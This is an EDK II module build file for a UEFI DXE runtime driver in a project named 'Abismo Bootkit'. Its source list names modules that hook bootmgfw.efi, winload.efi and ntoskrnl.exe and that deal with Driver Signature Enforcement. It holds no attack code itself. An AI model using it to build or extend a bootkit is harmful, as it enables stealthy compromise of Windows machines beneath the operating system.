# .INF File
# https://github.com/tianocore/tianocore.github.io/wiki/Build-Description-Files#the-inf-file
# This file describes how to build a module (i.e. a driver, library, application, etc…).

# DXE Runtime Driver


[Defines]
  INF_VERSION                    = 1.25                                     # Defines the version of the EDK II INF specification the INF file supports.
  BASE_NAME                      = AbismoDriverDXERuntime                   # Defines the base output name of the module (application, library, etc...) when built resulting in the final .efi or .lib binary.
  FILE_GUID                      = df8c3221-058a-4c81-a706-906e22178008     # A unique GUID for this module. See http://www.guidgen.com/
  MODULE_TYPE                    = DXE_RUNTIME_DRIVER                       # The type of module being built. This includes things such as UEFI_DRIVER, UEFI_APPLICATION, DXE_DRIVER, etc… For libraries it can be BASE, USER_DEFINED, etc…
  VERSION_STRING                 = 1.0                                      # The developer defined version of your module, Major "." Minor number.
  ENTRY_POINT                    = UefiMain                                 # If your module is not a library, this variable defines the function to begin execution. This is similar to the main() function in C.


# List the various packages the module will use. This tells the build system where to look for library classes (header files for the library), PCDs, GUIDs, Protocols, and PPIs via the different packages .DEC files. The .DCS file from this package is not used. Typically minimum required package is the MdePkg.dec
[Packages]
  AbismoBootkitPkg/AbismoBootkitPkg.dec                                     # Main package for the Abismo Bootkit project
  MdePkg/MdePkg.dec                                                         # The Module Development Environment Package (MdePkg) is a special package as it is the minimum infrastructure required to build a module
  MdeModulePkg/MdeModulePkg.dec                                             # This package provides the modules that conform to UEFI/PI Industry standards. It also provides the defintions(including PPIs/PROTOCOLs/GUIDs and library classes) and libraries instances, which are used for those modules.


# List the various source and header files used to build the module.
[Sources]
  AbismoDriverDXERuntime.c                                                  # Main
  Functions/1FunctionsPatchHookImage.c                                      # Patch Hook Image
  Functions/Utils/1FunctionsUtilsStrings.c                                  # Strings
  Functions/Utils/2FunctionsUtilsRegisters.c                                # Registers
  Functions/Utils/3FunctionsUtilsMemory.c                                   # Memory
  Functions/Utils/4FunctionsUtilsHeaders.c                                  # Headers
  Functions/Utils/5FunctionsUtilsPattern.c                                  # Pattern
  Functions/Utils/6FunctionsUtilsAddress.c                                  # Address
  Functions/Utils/7FunctionsUtilsPortableExecutable.c                       # Portable Executable
  Functions/Utils/8FunctionsUtilsTables.c                                   # Tables
  Functions/Hooks/1FunctionsHooksBootmgfwEfi1ArchStartBootApplication.c     # ArchStartBootApplication
  Functions/2FunctionsPatchHookWindowsBootManager.c                         # Patch Hook Windows Boot Manager                                               bootmgfw.efi
  Functions/Hooks/2FunctionsHooksWinloadEfi1OslFwpKernelSetupPhase1.c       # OslFwpKernelSetupPhase1
  Functions/3FunctionsPatchHookWindowsOSLoader.c                            # Patch Hook Windows OS Loader                                                  winload.efi
  Includes/zydis/src/Decoder.c                                              # https://github.com/zyantific/zydis/tree/master/src/Decoder.c
  Includes/zydis/src/DecoderData.c                                          # https://github.com/zyantific/zydis/tree/master/src/DecoderData.c
  Includes/zydis/src/MetaInfo.c                                             # https://github.com/zyantific/zydis/tree/master/src/MetaInfo.c
  Includes/zydis/src/Mnemonic.c                                             # https://github.com/zyantific/zydis/tree/master/src/Mnemonic.c
  Includes/zydis/src/Register.c                                             # https://github.com/zyantific/zydis/tree/master/src/Register.c
  Includes/zydis/src/Segment.c                                              # https://github.com/zyantific/zydis/tree/master/src/Segment.c
  Includes/zydis/src/SharedData.c                                           # https://github.com/zyantific/zydis/tree/master/src/SharedData.c
  Includes/zydis/src/String.c                                               # https://github.com/zyantific/zydis/tree/master/src/String.c
  Includes/zydis/src/Utils.c                                                # https://github.com/zyantific/zydis/tree/master/src/Utils.c
  Includes/zydis/src/Zydis.c                                                # https://github.com/zyantific/zydis/tree/master/src/Zydis.c
  Functions/Protections/1FunctionsProtectionsDriverSignatureEnforcement.c   # Driver Signature Enforcement                                                  DSE
  Functions/4FunctionsPatchHookWindowsKernel.c                              # Patch Hook Windows Kernel                                                     ntoskrnl.exe


# List the various libraries the module uses and should be linked with. This is the LibNameToReference value the library module used in its .INF file. For each entry in this section there needs to be an entry [LibraryClasses] sector of the .DSC file this module is associated with. This is because the packages in the [Packages] section are not used to determine the library module to link with.
[LibraryClasses]
  # Entry point
  UefiDriverEntryPoint
    # Module entry point library for UEFI drivers, DXE Drivers, DXE Runtime Drivers, and DXE SMM Drivers.
    # https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiDriverEntryPoint.h
  # Tables
  UefiBootServicesTableLib
    # Provides a service to retrieve a pointer to the EFI Boot Services Table. Only available to DXE and UEFI module types.
    # https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiBootServicesTableLib.h
  UefiRuntimeServicesTableLib
    # Provides a service to retrieve a pointer to the EFI Runtime Services Table.
    # https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiRuntimeServicesTableLib.h
  # Base
  UefiLib
    # Provides library functions for common UEFI operations. Only available to DXE and UEFI module types.
    # https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiLib.h
  # Time
  SynchronizationLib
    # Implementation of synchronization functions.
    # https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/SynchronizationLib.h
  DebugLib


# List the various protocol GUIDs variable name needed/used by the sources. The variable name is defined in one of the [Packages].DEC [Guids] section. Also listed are the Usage Block definitions for the protocol for this module.
[Protocols]
  gEfiLoadedImageProtocolGuid                                               ## CONSUMES
  gEfiSimpleFileSystemProtocolGuid                                          ## CONSUMES


# The optional Depex section is a replacement for the dependency file specified by the driver writer. This section can be used for inheritance from libraries, by supporting logical AND'ing of the different Depex expressions together.
[Depex]
  gEfiSimpleTextOutProtocolGuid


# Add compiler specific options needed to build the module.
[BuildOptions.Common]
  # Libraries
  *_*_*_CC_FLAGS = -D ZYAN_NO_LIBC -D ZYCORE_STATIC_BUILD -D ZYDIS_STATIC_BUILD -D ZYDIS_DISABLE_ENCODER -D ZYDIS_DISABLE_FORMATTER -D ZYDIS_DISABLE_AVX512 -D ZYDIS_DISABLE_KNC
  # Suppress specific warnings
  MSFT:*_*_*_CC_FLAGS = /wd4201
  INTEL:*_*_*_CC_FLAGS = -wd4201,188,2415
  # Enable high-level optimization and debugging for INTEL RELEASE configuration
  MSFT:RELEASE_*_*_CC_FLAGS = /O2 /Ot /Zi
  INTEL:RELEASE_*_*_CC_FLAGS = /O3 /Ot /Zi /Qopt-report-embed-
  # Debug and Releasr
  *:DEBUG_*_*_PP_FLAGS = -D EFI_DEBUG
  *:DEBUG_*_*_CC_FLAGS = -D EFI_DEBUG
  *:RELEASE_*_*_CC_FLAGS = -D MDEPKG_NDEBUG
